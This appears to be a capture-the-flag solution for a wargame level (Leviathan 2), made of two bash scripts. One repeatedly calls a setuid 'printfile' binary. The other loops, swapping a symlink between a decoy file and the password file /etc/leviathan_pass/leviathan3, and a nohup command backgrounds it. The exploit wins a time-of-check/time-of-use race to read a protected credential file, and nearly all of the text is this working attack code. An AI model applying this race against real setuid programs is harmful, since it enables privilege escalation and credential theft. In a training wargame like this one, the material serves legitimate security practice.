#!/bin/bash

# Infinite loop
while true; do
	file_content=$(/home/leviathan2/printfile /tmp/dolev/sym 2>/dev/null)
	if [ -n "$file_content" ] && [ "$file_content" != "You cant have that file..." ]; then
		echo "$file_content"
	fi
done


#!/bin/bash
# Infinite loop run as background process => nohup ./sym.sh > script.log 2>&1 &
while true; do
    ln -sf /etc/leviathan_pass/leviathan3 /tmp/dolev/sym
    ln -sf /tmp/dolev/delete /tmp/dolev/sym
done

# run
nohup ./sym_change.sh > script.log 2>&1 &
